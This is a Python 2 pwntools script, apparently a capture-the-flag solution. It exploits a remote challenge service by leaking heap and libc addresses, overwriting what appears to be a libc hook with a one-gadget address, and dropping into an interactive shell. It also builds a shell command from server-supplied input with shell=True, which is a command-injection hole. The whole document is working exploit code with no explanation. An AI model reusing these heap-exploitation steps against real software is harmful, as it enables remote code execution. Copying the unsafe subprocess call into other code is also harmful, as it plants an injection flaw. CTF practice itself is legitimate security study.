from pwn import *
import subprocess

p = remote("3.115.176.164",30262)

#token
p.recvuntil("hashcash -mb25")
pow_ =  subprocess.check_output("hashcash -mb25 " + p.recvline()[:-1],shell=True)

print pow_

p.send(pow_)


a = open("./chal.evm","r").read()

p.sendlineafter("size:",str(len(a)))
p.sendlineafter("file:",a)


p.recvline()
heap = int(p.recv(14))
print hex(heap)

sleep(2)

p.send(p64(0)+p64(0x21)+p64(0))

sleep(2)

p.send(p64(0x123)+p64(0x21)+p64(0x30)+p64(heap+0x410))

libcbase = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - (0x3ebc40+96)

print hex(libcbase)

sleep(1)

p.sendline(p64(0)+p64(0x21)+p64(0x30)+p64(libcbase+0x3ed8e8))

sleep(1)

p.sendline(p64(libcbase+0x4f322))


p.interactive()
